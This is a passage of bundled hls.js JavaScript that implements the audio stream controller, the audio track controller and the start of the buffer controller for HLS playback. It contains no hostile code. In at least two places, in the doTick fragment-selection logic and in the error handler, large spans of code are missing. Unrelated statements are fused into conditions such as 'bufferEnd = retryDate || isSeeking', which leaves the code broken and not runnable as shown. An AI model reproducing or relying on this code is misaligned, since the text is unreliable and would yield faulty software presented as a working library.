= _interopRequireDefault(_eventHandler); var _levelHelper = _dereq_(35); var _levelHelper2 = _interopRequireDefault(_levelHelper); var _timeRanges = _dereq_(51); var _timeRanges2 = _interopRequireDefault(_timeRanges); var _errors = _dereq_(30); var _logger = _dereq_(50); function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; } function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } } function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError(\"this hasn't been initialised - super() hasn't been called\"); } return call && (typeof call === \"object\" || typeof call === \"function\") ? call : self; } function _inherits(subClass, superClass) { if (typeof superClass !== \"function\" && superClass !== null) { throw new TypeError(\"Super expression must either be null or a function, not \" + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; } /* * Audio Stream Controller */ var State = { STOPPED: 'STOPPED', STARTING: 'STARTING', IDLE: 'IDLE', PAUSED: 'PAUSED', KEY_LOADING: 'KEY_LOADING', FRAG_LOADING: 'FRAG_LOADING', FRAG_LOADING_WAITING_RETRY: 'FRAG_LOADING_WAITING_RETRY', WAITING_TRACK: 'WAITING_TRACK', PARSING: 'PARSING', PARSED: 'PARSED', BUFFER_FLUSHING: 'BUFFER_FLUSHING', ENDED: 'ENDED', ERROR: 'ERROR', WAITING_INIT_PTS: 'WAITING_INIT_PTS' }; var AudioStreamController = function (_EventHandler) { _inherits(AudioStreamController, _EventHandler); function AudioStreamController(hls) { _classCallCheck(this, AudioStreamController); var _this = _possibleConstructorReturn(this, (AudioStreamController.__proto__ || Object.getPrototypeOf(AudioStreamController)).call(this, hls, _events2.default.MEDIA_ATTACHED, _events2.default.MEDIA_DETACHING, _events2.default.AUDIO_TRACKS_UPDATED, _events2.default.AUDIO_TRACK_SWITCHING, _events2.default.AUDIO_TRACK_LOADED, _events2.default.KEY_LOADED, _events2.default.FRAG_LOADED, _events2.default.FRAG_PARSING_INIT_SEGMENT, _events2.default.FRAG_PARSING_DATA, _events2.default.FRAG_PARSED, _events2.default.ERROR, _events2.default.BUFFER_CREATED, _events2.default.BUFFER_APPENDED, _events2.default.BUFFER_FLUSHED, _events2.default.INIT_PTS_FOUND)); _this.config = hls.config; _this.audioCodecSwap = false; _this.ticks = 0; _this._state = State.STOPPED; _this.ontick = _this.tick.bind(_this); _this.initPTS = []; _this.waitingFragment = null; return _this; } _createClass(AudioStreamController, [{ key: 'destroy', value: function destroy() { this.stopLoad(); if (this.timer) { clearInterval(this.timer); this.timer = null; } _eventHandler2.default.prototype.destroy.call(this); this.state = State.STOPPED; } //Signal that video PTS was found }, { key: 'onInitPtsFound', value: function onInitPtsFound(data) { var demuxerId = data.id, cc = data.frag.cc, initPTS = data.initPTS; if (demuxerId === 'main') { //Always update the new INIT PTS //Can change due level switch this.initPTS[cc] = initPTS; _logger.logger.log('InitPTS for cc:' + cc + ' found from video track:' + initPTS); //If we are waiting we need to demux/remux the waiting frag //With the new initPTS if (this.state === State.WAITING_INIT_PTS) { _logger.logger.log('sending pending audio frag to demuxer'); this.state = State.FRAG_LOADING; //We have audio frag waiting or video pts //Let process it this.onFragLoaded(this.waitingFragment); //Lets clean the waiting frag this.waitingFragment = null; } } } }, { key: 'startLoad', value: function startLoad(startPosition) { if (this.tracks) { var lastCurrentTime = this.lastCurrentTime; this.stopLoad(); if (!this.timer) { this.timer = setInterval(this.ontick, 100); } this.fragLoadError = 0; if (lastCurrentTime > 0 && startPosition === -1) { _logger.logger.log('audio:override startPosition with lastCurrentTime @' + lastCurrentTime.toFixed(3)); this.state = State.IDLE; } else { this.lastCurrentTime = this.startPosition ? this.startPosition : startPosition; this.state = State.STARTING; } this.nextLoadPosition = this.startPosition = this.lastCurrentTime; this.tick(); } else { this.startPosition = startPosition; this.state = State.STOPPED; } } }, { key: 'stopLoad', value: function stopLoad() { var frag = this.fragCurrent; if (frag) { if (frag.loader) { frag.loader.abort(); } this.fragCurrent = null; } this.fragPrevious = null; if (this.demuxer) { this.demuxer.destroy(); this.demuxer = null; } this.state = State.STOPPED; } }, { key: 'tick', value: function tick() { this.ticks++; if (this.ticks === 1) { this.doTick(); if (this.ticks > 1) { setTimeout(this.tick, 1); } this.ticks = 0; } } }, { key: 'doTick', value: function doTick() { var pos, track, trackDetails, hls = this.hls, config = hls.config; //logger.log('audioStream:' + this.state); switch (this.state) { case State.ERROR: //don't do anything in error state to avoid breaking further ... case State.PAUSED: //don't do anything in paused state either ... case State.BUFFER_FLUSHING: break; case State.STARTING: this.state = State.WAITING_TRACK; this.loadedmetadata = false; break; case State.IDLE: var tracks = this.tracks; // audio tracks not received => exit loop if (!tracks) { break; } // if video not attached AND // start fragment already requested OR start frag prefetch disable // exit loop // => if media not attached but start frag prefetch is enabled and start frag not requested yet, we will not exit loop if (!this.media && (this.startFragRequested || !config.startFragPrefetch)) { break; } // determine next candidate fragment to be loaded, based on current position and // end of buffer position // if we have not yet loaded any fragment, start loading from start position if (this.loadedmetadata) { pos = this.media.currentTime; } else { pos = this.nextLoadPosition; } var media = this.mediaBuffer ? this.mediaBuffer : this.media, bufferInfo = _bufferHelper2.default.bufferInfo(media, pos, config.maxBufferHole), bufferLen = bufferInfo.len, bufferEnd = bufferInfo.end, fragPrevious = this.fragPrevious, maxBufLen = config.maxMaxBufferLength, audioSwitch = this.audioSwitch, trackId = this.trackId; // if buffer length is less than maxBufLen try to load a new fragment if ((bufferLen < maxBufLen || audioSwitch) && trackId < tracks.length) { trackDetails = tracks[trackId].details; // if track info not retrieved yet, switch state and wait for track retrieval if (typeof trackDetails === 'undefined') { this.state = State.WAITING_TRACK; break; } // we just got done loading the final fragment, check if we need to finalize media stream if (!audioSwitch && !trackDetails.live && fragPrevious && fragPrevious.sn === trackDetails.endSN) { // if we are not seeking or if we are seeking but everything (almost) til the end is buffered, let's signal eos // we don't compare exactly media.duration === bufferInfo.end as there could be some subtle media duration difference when switching // between different renditions. using half frag duration should help cope with these cases. if (!this.media.seeking || this.media.duration - bufferEnd < fragPrevious.duration / 2) { // Finalize the media stream this.hls.trigger(_events2.default.BUFFER_EOS, { type: 'audio' }); this.state = State.ENDED; break; } } // find fragment index, contiguous with end of buffer position var fragments = trackDetails.fragments, fragLen = fragments.length, start = fragments[0].start, end = fragments[fragLen - 1].start + fragments[fragLen - 1].duration, frag = void 0; // When switching audio track, reload audio as close as possible to currentTime if (audioSwitch) { if (trackDetails.live && !trackDetails.PTSKnown) { _logger.logger.log('switching audiotrack, live stream, unknown PTS,load first fragment'); bufferEnd = 0; } else { bufferEnd = pos; // if currentTime (pos) is less than alt audio playlist start time, it means that alt audio is ahead of currentTime if (trackDetails.PTSKnown && pos < start) { // if everything is buffered from pos to start or if audio buffer upfront, let's seek to start if (bufferInfo.end > start || bufferInfo.nextStart) { _logger.logger.log('alt audio track ahead of main track, seek to start of alt audio track'); this.media.currentTime = start + 0.05; } else { return; } } } } if (trackDetails.initSegment && !trackDetails.initSegment.data) { frag = trackDetails.initSegment; } // if bufferEnd before start of playlist, load first fragment else if (bufferEnd = retryDate || isSeeking) { _logger.logger.log('audioStreamController: retryDate reached, switch back to IDLE state'); this.state = State.IDLE; } break; case State.WAITING_INIT_PTS: case State.STOPPED: case State.FRAG_LOADING: case State.PARSING: case State.PARSED: case State.ENDED: break; default: break; } } }, { key: 'onMediaAttached', value: function onMediaAttached(data) { var media = this.media = this.mediaBuffer = data.media; this.onvseeking = this.onMediaSeeking.bind(this); this.onvended = this.onMediaEnded.bind(this); media.addEventListener('seeking', this.onvseeking); media.addEventListener('ended', this.onvended); var config = this.config; if (this.tracks && config.autoStartLoad) { this.startLoad(config.startPosition); } } }, { key: 'onMediaDetaching', value: function onMediaDetaching() { var media = this.media; if (media && media.ended) { _logger.logger.log('MSE detaching and video ended, reset startPosition'); this.startPosition = this.lastCurrentTime = 0; } // reset fragment loading counter on MSE detaching to avoid reporting FRAG_LOOP_LOADING_ERROR after error recovery var tracks = this.tracks; if (tracks) { // reset fragment load counter tracks.forEach(function (track) { if (track.details) { track.details.fragments.forEach(function (fragment) { fragment.loadCounter = undefined; }); } }); } // remove video listeners if (media) { media.removeEventListener('seeking', this.onvseeking); media.removeEventListener('ended', this.onvended); this.onvseeking = this.onvseeked = this.onvended = null; } this.media = this.mediaBuffer = null; this.loadedmetadata = false; this.stopLoad(); } }, { key: 'onMediaSeeking', value: function onMediaSeeking() { if (this.state === State.ENDED) { // switch to IDLE state to check for potential new fragment this.state = State.IDLE; } if (this.media) { this.lastCurrentTime = this.media.currentTime; } // avoid reporting fragment loop loading error in case user is seeking several times on same position if (this.fragLoadIdx !== undefined) { this.fragLoadIdx += 2 * this.config.fragLoadingLoopThreshold; } // tick to speed up processing this.tick(); } }, { key: 'onMediaEnded', value: function onMediaEnded() { // reset startPosition and lastCurrentTime to restart playback @ stream beginning this.startPosition = this.lastCurrentTime = 0; } }, { key: 'onAudioTracksUpdated', value: function onAudioTracksUpdated(data) { _logger.logger.log('audio tracks updated'); this.tracks = data.audioTracks; } }, { key: 'onAudioTrackSwitching', value: function onAudioTrackSwitching(data) { // if any URL found on new audio track, it is an alternate audio track var altAudio = !!data.url; this.trackId = data.id; this.state = State.IDLE; this.fragCurrent = null; this.state = State.PAUSED; this.waitingFragment = null; // destroy useless demuxer when switching audio to main if (!altAudio) { if (this.demuxer) { this.demuxer.destroy(); this.demuxer = null; } } else { // switching to audio track, start timer if not already started if (!this.timer) { this.timer = setInterval(this.ontick, 100); } } //should we switch tracks ? if (altAudio) { this.audioSwitch = true; //main audio track are handled by stream-controller, just do something if switching to alt audio track this.state = State.IDLE; // increase fragment load Index to avoid frag loop loading error after buffer flush if (this.fragLoadIdx !== undefined) { this.fragLoadIdx += 2 * this.config.fragLoadingLoopThreshold; } } this.tick(); } }, { key: 'onAudioTrackLoaded', value: function onAudioTrackLoaded(data) { var newDetails = data.details, trackId = data.id, track = this.tracks[trackId], duration = newDetails.totalduration, sliding = 0; _logger.logger.log('track ' + trackId + ' loaded [' + newDetails.startSN + ',' + newDetails.endSN + '],duration:' + duration); if (newDetails.live) { var curDetails = track.details; if (curDetails && newDetails.fragments.length > 0) { // we already have details for that level, merge them _levelHelper2.default.mergeDetails(curDetails, newDetails); sliding = newDetails.fragments[0].start; // TODO //this.liveSyncPosition = this.computeLivePosition(sliding, curDetails); if (newDetails.PTSKnown) { _logger.logger.log('live audio playlist sliding:' + sliding.toFixed(3)); } else { _logger.logger.log('live audio playlist - outdated PTS, unknown sliding'); } } else { newDetails.PTSKnown = false; _logger.logger.log('live audio playlist - first load, unknown sliding'); } } else { newDetails.PTSKnown = false; } track.details = newDetails; // compute start position if (!this.startFragRequested) { // compute start position if set to -1. use it straight away if value is defined if (this.startPosition === -1) { // first, check if start time offset has been set in playlist, if yes, use this value var startTimeOffset = newDetails.startTimeOffset; if (!isNaN(startTimeOffset)) { _logger.logger.log('start time offset found in playlist, adjust startPosition to ' + startTimeOffset); this.startPosition = startTimeOffset; } else { this.startPosition = 0; } } this.nextLoadPosition = this.startPosition; } // only switch batck to IDLE state if we were waiting for track to start downloading a new fragment if (this.state === State.WAITING_TRACK) { this.state = State.IDLE; } //trigger handler right now this.tick(); } }, { key: 'onKeyLoaded', value: function onKeyLoaded() { if (this.state === State.KEY_LOADING) { this.state = State.IDLE; this.tick(); } } }, { key: 'onFragLoaded', value: function onFragLoaded(data) { var fragCurrent = this.fragCurrent, fragLoaded = data.frag; if (this.state === State.FRAG_LOADING && fragCurrent && fragLoaded.type === 'audio' && fragLoaded.level === fragCurrent.level && fragLoaded.sn === fragCurrent.sn) { var track = this.tracks[this.trackId], details = track.details, duration = details.totalduration, trackId = fragCurrent.level, sn = fragCurrent.sn, cc = fragCurrent.cc, audioCodec = this.config.defaultAudioCodec || track.audioCodec || 'mp4a.40.2', stats = this.stats = data.stats; if (sn === 'initSegment') { this.state = State.IDLE; stats.tparsed = stats.tbuffered = performance.now(); details.initSegment.data = data.payload; this.hls.trigger(_events2.default.FRAG_BUFFERED, { stats: stats, frag: fragCurrent, id: 'audio' }); this.tick(); } else { this.state = State.PARSING; // transmux the MPEG-TS data to ISO-BMFF segments this.appended = false; if (!this.demuxer) { this.demuxer = new _demuxer2.default(this.hls, 'audio'); } //Check if we have video initPTS // If not we need to wait for it var initPTS = this.initPTS[cc]; var initSegmentData = details.initSegment ? details.initSegment.data : []; if (initSegmentData || initPTS !== undefined) { this.pendingBuffering = true; _logger.logger.log('Demuxing ' + sn + ' of [' + details.startSN + ' ,' + details.endSN + '],track ' + trackId); // time Offset is accurate if level PTS is known, or if playlist is not sliding (not live) var accurateTimeOffset = false; //details.PTSKnown || !details.live; this.demuxer.push(data.payload, initSegmentData, audioCodec, null, fragCurrent, duration, accurateTimeOffset, initPTS); } else { _logger.logger.log('unknown video PTS for continuity counter ' + cc + ', waiting for video PTS before demuxing audio frag ' + sn + ' of [' + details.startSN + ' ,' + details.endSN + '],track ' + trackId); this.waitingFragment = data; this.state = State.WAITING_INIT_PTS; } } } this.fragLoadError = 0; } }, { key: 'onFragParsingInitSegment', value: function onFragParsingInitSegment(data) { var fragCurrent = this.fragCurrent; var fragNew = data.frag; if (fragCurrent && data.id === 'audio' && fragNew.sn === fragCurrent.sn && fragNew.level === fragCurrent.level && this.state === State.PARSING) { var tracks = data.tracks, track = void 0; // delete any video track found on audio demuxer if (tracks.video) { delete tracks.video; } // include levelCodec in audio and video tracks track = tracks.audio; if (track) { track.levelCodec = 'mp4a.40.2'; track.id = data.id; this.hls.trigger(_events2.default.BUFFER_CODECS, tracks); _logger.logger.log('audio track:audio,container:' + track.container + ',codecs[level/parsed]=[' + track.levelCodec + '/' + track.codec + ']'); var initSegment = track.initSegment; if (initSegment) { var appendObj = { type: 'audio', data: initSegment, parent: 'audio', content: 'initSegment' }; if (this.audioSwitch) { this.pendingData = [appendObj]; } else { this.appended = true; // arm pending Buffering flag before appending a segment this.pendingBuffering = true; this.hls.trigger(_events2.default.BUFFER_APPENDING, appendObj); } } //trigger handler right now this.tick(); } } } }, { key: 'onFragParsingData', value: function onFragParsingData(data) { var _this2 = this; var fragCurrent = this.fragCurrent; var fragNew = data.frag; if (fragCurrent && data.id === 'audio' && data.type === 'audio' && fragNew.sn === fragCurrent.sn && fragNew.level === fragCurrent.level && this.state === State.PARSING) { var trackId = this.trackId, track = this.tracks[trackId], hls = this.hls; if (isNaN(data.endPTS)) { data.endPTS = data.startPTS + fragCurrent.duration; data.endDTS = data.startDTS + fragCurrent.duration; } _logger.logger.log('parsed ' + data.type + ',PTS:[' + data.startPTS.toFixed(3) + ',' + data.endPTS.toFixed(3) + '],DTS:[' + data.startDTS.toFixed(3) + '/' + data.endDTS.toFixed(3) + '],nb:' + data.nb); _levelHelper2.default.updateFragPTSDTS(track.details, fragCurrent.sn, data.startPTS, data.endPTS); var audioSwitch = this.audioSwitch, media = this.media, appendOnBufferFlush = false; //Only flush audio from old audio tracks when PTS is known on new audio track if (audioSwitch && media) { if (media.readyState) { var currentTime = media.currentTime; _logger.logger.log('switching audio track : currentTime:' + currentTime); if (currentTime >= data.startPTS) { _logger.logger.log('switching audio track : flushing all audio'); this.state = State.BUFFER_FLUSHING; hls.trigger(_events2.default.BUFFER_FLUSHING, { startOffset: 0, endOffset: Number.POSITIVE_INFINITY, type: 'audio' }); appendOnBufferFlush = true; //Lets announce that the initial audio track switch flush occur this.audioSwitch = false; hls.trigger(_events2.default.AUDIO_TRACK_SWITCHED, { id: trackId }); } } else { //Lets announce that the initial audio track switch flush occur this.audioSwitch = false; hls.trigger(_events2.default.AUDIO_TRACK_SWITCHED, { id: trackId }); } } var pendingData = this.pendingData; if (!this.audioSwitch) { [data.data1, data.data2].forEach(function (buffer) { if (buffer && buffer.length) { pendingData.push({ type: data.type, data: buffer, parent: 'audio', content: 'data' }); } }); if (!appendOnBufferFlush && pendingData.length) { pendingData.forEach(function (appendObj) { // only append in PARSING state (rationale is that an appending error could happen synchronously on first segment appending) // in that case it is useless to append following segments if (_this2.state === State.PARSING) { // arm pending Buffering flag before appending a segment _this2.pendingBuffering = true; _this2.hls.trigger(_events2.default.BUFFER_APPENDING, appendObj); } }); this.pendingData = []; this.appended = true; } } //trigger handler right now this.tick(); } } }, { key: 'onFragParsed', value: function onFragParsed(data) { var fragCurrent = this.fragCurrent; var fragNew = data.frag; if (fragCurrent && data.id === 'audio' && fragNew.sn === fragCurrent.sn && fragNew.level === fragCurrent.level && this.state === State.PARSING) { this.stats.tparsed = performance.now(); this.state = State.PARSED; this._checkAppendedParsed(); } } }, { key: 'onBufferCreated', value: function onBufferCreated(data) { var audioTrack = data.tracks.audio; if (audioTrack) { this.mediaBuffer = audioTrack.buffer; this.loadedmetadata = true; } } }, { key: 'onBufferAppended', value: function onBufferAppended(data) { if (data.parent === 'audio') { var state = this.state; if (state === State.PARSING || state === State.PARSED) { // check if all buffers have been appended this.pendingBuffering = data.pending > 0; this._checkAppendedParsed(); } } } }, { key: '_checkAppendedParsed', value: function _checkAppendedParsed() { //trigger handler right now if (this.state === State.PARSED && (!this.appended || !this.pendingBuffering)) { var frag = this.fragCurrent, stats = this.stats, hls = this.hls; if (frag) { this.fragPrevious = frag; stats.tbuffered = performance.now(); hls.trigger(_events2.default.FRAG_BUFFERED, { stats: stats, frag: frag, id: 'audio' }); var media = this.mediaBuffer ? this.mediaBuffer : this.media; _logger.logger.log('audio buffered : ' + _timeRanges2.default.toString(media.buffered)); if (this.audioSwitch && this.appended) { this.audioSwitch = false; hls.trigger(_events2.default.AUDIO_TRACK_SWITCHED, { id: this.trackId }); } this.state = State.IDLE; } this.tick(); } } }, { key: 'onError', value: function onError(data) { var frag = data.frag; // don't handle frag error not related to audio fragment if (frag && frag.type !== 'audio') { return; } switch (data.details) { case _errors.ErrorDetails.FRAG_LOAD_ERROR: case _errors.ErrorDetails.FRAG_LOAD_TIMEOUT: if (!data.fatal) { var loadError = this.fragLoadError; if (loadError) { loadError++; } else { loadError = 1; } var config = this.config; if (loadError = _config.maxBufferLength) { // reduce max buffer length as it might be too high. we do this to avoid loop flushing ... _config.maxMaxBufferLength /= 2; _logger.logger.warn('audio:reduce max buffer length to ' + _config.maxMaxBufferLength + 's'); // increase fragment load Index to avoid frag loop loading error after buffer flush this.fragLoadIdx += 2 * _config.fragLoadingLoopThreshold; } this.state = State.IDLE; } else { // current position is not buffered, but browser is still complaining about buffer full error // this happens on IE/Edge, refer to https://github.com/video-dev/hls.js/pull/708 // in that case flush the whole audio buffer to recover _logger.logger.warn('buffer full error also media.currentTime is not buffered, flush audio buffer'); this.fragCurrent = null; // flush everything this.state = State.BUFFER_FLUSHING; this.hls.trigger(_events2.default.BUFFER_FLUSHING, { startOffset: 0, endOffset: Number.POSITIVE_INFINITY, type: 'audio' }); } } break; default: break; } } }, { key: 'onBufferFlushed', value: function onBufferFlushed() { var _this3 = this; var pendingData = this.pendingData; if (pendingData && pendingData.length) { _logger.logger.log('appending pending audio data on Buffer Flushed'); pendingData.forEach(function (appendObj) { _this3.hls.trigger(_events2.default.BUFFER_APPENDING, appendObj); }); this.appended = true; this.pendingData = []; this.state = State.PARSED; } else { // move to IDLE once flush complete. this should trigger new fragment loading this.state = State.IDLE; // reset reference to frag this.fragPrevious = null; this.tick(); } } }, { key: 'state', set: function set(nextState) { if (this.state !== nextState) { var previousState = this.state; this._state = nextState; _logger.logger.log('audio stream:' + previousState + '->' + nextState); } }, get: function get() { return this._state; } }]); return AudioStreamController; }(_eventHandler2.default); exports.default = AudioStreamController; },{\"24\":24,\"30\":30,\"31\":31,\"32\":32,\"34\":34,\"35\":35,\"45\":45,\"50\":50,\"51\":51}],7:[function(_dereq_,module,exports){ 'use strict'; Object.defineProperty(exports, \"__esModule\", { value: true }); var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (\"value\" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); var _events = _dereq_(32); var _events2 = _interopRequireDefault(_events); var _eventHandler = _dereq_(31); var _eventHandler2 = _interopRequireDefault(_eventHandler); var _logger = _dereq_(50); function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; } function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } } function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError(\"this hasn't been initialised - super() hasn't been called\"); } return call && (typeof call === \"object\" || typeof call === \"function\") ? call : self; } function _inherits(subClass, superClass) { if (typeof superClass !== \"function\" && superClass !== null) { throw new TypeError(\"Super expression must either be null or a function, not \" + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; } /* * audio track controller */ var AudioTrackController = function (_EventHandler) { _inherits(AudioTrackController, _EventHandler); function AudioTrackController(hls) { _classCallCheck(this, AudioTrackController); var _this = _possibleConstructorReturn(this, (AudioTrackController.__proto__ || Object.getPrototypeOf(AudioTrackController)).call(this, hls, _events2.default.MANIFEST_LOADING, _events2.default.MANIFEST_LOADED, _events2.default.AUDIO_TRACK_LOADED)); _this.ticks = 0; _this.ontick = _this.tick.bind(_this); return _this; } _createClass(AudioTrackController, [{ key: 'destroy', value: function destroy() { _eventHandler2.default.prototype.destroy.call(this); } }, { key: 'tick', value: function tick() { this.ticks++; if (this.ticks === 1) { this.doTick(); if (this.ticks > 1) { setTimeout(this.tick, 1); } this.ticks = 0; } } }, { key: 'doTick', value: function doTick() { this.updateTrack(this.trackId); } }, { key: 'onManifestLoading', value: function onManifestLoading() { // reset audio tracks on manifest loading this.tracks = []; this.trackId = -1; } }, { key: 'onManifestLoaded', value: function onManifestLoaded(data) { var _this2 = this; var tracks = data.audioTracks || []; var defaultFound = false; this.tracks = tracks; this.hls.trigger(_events2.default.AUDIO_TRACKS_UPDATED, { audioTracks: tracks }); // loop through available audio tracks and autoselect default if needed var id = 0; tracks.forEach(function (track) { if (track.default) { _this2.audioTrack = id; defaultFound = true; return; } id++; }); if (defaultFound === false && tracks.length) { _logger.logger.log('no default audio track defined, use first audio track as default'); this.audioTrack = 0; } } }, { key: 'onAudioTrackLoaded', value: function onAudioTrackLoaded(data) { if (data.id < this.tracks.length) { _logger.logger.log('audioTrack ' + data.id + ' loaded'); this.tracks[data.id].details = data.details; // check if current playlist is a live playlist if (data.details.live && !this.timer) { // if live playlist we will have to reload it periodically // set reload period to playlist target duration this.timer = setInterval(this.ontick, 1000 * data.details.targetduration); } if (!data.details.live && this.timer) { // playlist is not live and timer is armed : stopping it clearInterval(this.timer); this.timer = null; } } } /** get alternate audio tracks list from playlist **/ }, { key: 'setAudioTrackInternal', value: function setAudioTrackInternal(newId) { // check if level idx is valid if (newId >= 0 && newId < this.tracks.length) { // stopping live reloading timer if any if (this.timer) { clearInterval(this.timer); this.timer = null; } this.trackId = newId; _logger.logger.log('switching to audioTrack ' + newId); var audioTrack = this.tracks[newId], hls = this.hls, type = audioTrack.type, url = audioTrack.url, eventObj = { id: newId, type: type, url: url }; // keep AUDIO_TRACK_SWITCH for legacy reason hls.trigger(_events2.default.AUDIO_TRACK_SWITCH, eventObj); hls.trigger(_events2.default.AUDIO_TRACK_SWITCHING, eventObj); // check if we need to load playlist for this audio Track var details = audioTrack.details; if (url && (details === undefined || details.live === true)) { // track not retrieved yet, or live playlist we need to (re)load it _logger.logger.log('(re)loading playlist for audioTrack ' + newId); hls.trigger(_events2.default.AUDIO_TRACK_LOADING, { url: url, id: newId }); } } } }, { key: 'updateTrack', value: function updateTrack(newId) { // check if level idx is valid if (newId >= 0 && newId < this.tracks.length) { // stopping live reloading timer if any if (this.timer) { clearInterval(this.timer); this.timer = null; } this.trackId = newId; _logger.logger.log('updating audioTrack ' + newId); var audioTrack = this.tracks[newId], url = audioTrack.url; // check if we need to load playlist for this audio Track var details = audioTrack.details; if (url && (details === undefined || details.live === true)) { // track not retrieved yet, or live playlist we need to (re)load it _logger.logger.log('(re)loading playlist for audioTrack ' + newId); this.hls.trigger(_events2.default.AUDIO_TRACK_LOADING, { url: url, id: newId }); } } } }, { key: 'audioTracks', get: function get() { return this.tracks; } /** get index of the selected audio track (index in audio track lists) **/ }, { key: 'audioTrack', get: function get() { return this.trackId; } /** select an audio track, based on its index in audio track lists**/ , set: function set(audioTrackId) { if (this.trackId !== audioTrackId || this.tracks[audioTrackId].details === undefined) { this.setAudioTrackInternal(audioTrackId); } } }]); return AudioTrackController; }(_eventHandler2.default); exports.default = AudioTrackController; },{\"31\":31,\"32\":32,\"50\":50}],8:[function(_dereq_,module,exports){ 'use strict'; Object.defineProperty(exports, \"__esModule\", { value: true }); var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (\"value\" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); var _events = _dereq_(32); var _events2 = _interopRequireDefault(_events); var _eventHandler = _dereq_(31); var _eventHandler2 = _interopRequireDefault(_eventHandler); var _logger = _dereq_(50); var _errors = _dereq_(30); function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; } function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } } function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError(\"this hasn't been initialised - super() hasn't been called\"); } return call && (typeof call === \"object\" || typeof call === \"function\") ? call : self; } function _inherits(subClass, superClass) { if (typeof superClass !== \"function\" && superClass !== null) { throw new TypeError(\"Super expression must either be null or a function, not \" + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; } /* * Buffer Controller */ var BufferController = function (_EventHandler) { _inherits(BufferController, _EventHandler); function BufferController(hls) { _classCallCheck(this, BufferController); // the value that we have set mediasource.duration to // (the actual duration may be tweaked slighly by the browser) var _this = _possibleConstructorReturn(this, (BufferController.__proto__ || Object.getPrototypeOf(BufferController)).call(this, hls, _events2.default.MEDIA_ATTACHING, _events2.default.MEDIA_DETACHING, _events2.default.MANIFEST_PARSED, _events2.default.BUFFER_RESET, _events2.default.BUFFER_APPENDING, _events2.default.BUFFER_CODECS, _events2.default.BUFFER_EOS, _events2.default.BUFFER_FLUSHING, _events2.default.LEVEL_PTS_UPDATED, _events2.default.LEVEL_UPDATED)); _this._msDuration = null; // the value that we want to set mediaSource.duration to _this._levelDuration = null; // Source Buffer listeners _this.onsbue = _this.onSBUpdateEnd.bind(_this); _this.onsbe = _this.onSBUpdateError.bind(_this); _this.pendingTracks = {}; _this.tracks = {}; return _this; } _createClass(BufferController, [{ key: 'destroy', value: function destroy() { _eventHandler2.default.prototype.destroy.call(this); } }, { key: 'onLevelPtsUpdated', value: function onLevelPtsUpdated(data) { var type = data.type; var audioTrack = this.tracks.audio; // Adjusting `SourceBuffer.timestampOffset` (desired point in the timeline where the next frames should be appended) // in Chrome browser when we detect MPEG audio container and time delta between level PTS and `SourceBuffer.timestampOffset` // is greater than 100ms (this is enough to handle seek for VOD or level change for LIVE videos). At the time of change we issue // `SourceBuffer.abort()` and adjusting `SourceBuffer.timestampOffset` if `SourceBuffer.updating` is false or awaiting `updateend` // event if SB is in updating state. // More info here: https://github.com/video-dev/hls.js/issues/332#issuecomment-257986486 if (type === 'audio' && audioTrack && audioTrack.container === 'audio/mpeg') { // Chrome audio mp3 track var audioBuffer = this.sourceBuffer.audio; var delta = Math.abs(audioBuffer.timestampOffset - data.start); // adjust timestamp offset if time delta is greater than 100ms if (delta > 0.1) { var updating = audioBuffer.updating; try { audioBuffer.abort(); } catch (err) { updating = true; _logger.logger.warn('can not abort audio buffer: ' + err); } if (!updating) { _logger.logger.warn('change mpeg audio timestamp offset from ' + audioBuffer.timestampOffset + ' to ' + data.start); audioBuffer.timestampOffset = data.start; } else { this.audioTimestampOffset = data.start; } } } } }, { key: 'onManifestParsed', value: function onManifestParsed(data) { var audioExpected = data.audio, videoExpected = data.video, sourceBufferNb = 0; // in case of alt audio 2 BUFFER_CODECS events will be triggered, one per stream controller // sourcebuffers will be created all at once when the expected nb of tracks will be reached // in case alt audio is not used, only one BUFFER_CODEC event will be fired from main stream controller // it will contain the expected nb of source buffers, no need to compute it if (data.altAudio && (audioExpected || videoExpected)) { sourceBufferNb = (audioExpected ? 1 : 0) + (videoExpected ? 1 : 0); _logger.logger.log(sourceBufferNb + ' sourceBuffer(s) expected'); } this.sourceBufferNb = sourceBufferNb; } }, { key: 'onMediaAttaching', value: function onMediaAttaching(data) { var media = this.media = data.media; if (media) { // setup the media source var ms = this.mediaSource = new MediaSource(); //Media Source listeners this.onmso = this.onMediaSourceOpen.bind(this); this.onmse = this.onMediaSourceEnded.bind(this); this.onmsc = this.onMediaSourceClose.bind(this); ms.addEventListener('sourceopen', this.onmso); ms.addEventListener('sourceended', 